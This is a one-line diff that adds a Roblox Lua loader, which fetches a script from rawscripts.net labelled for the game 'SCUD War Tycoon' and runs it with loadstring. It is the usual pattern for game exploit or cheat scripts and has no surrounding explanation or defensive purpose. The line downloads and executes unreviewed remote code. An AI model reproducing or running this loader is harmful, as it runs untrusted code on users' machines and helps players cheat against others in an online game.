@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/SCUD-War-Tycoon-The-BSMT-243883"))()
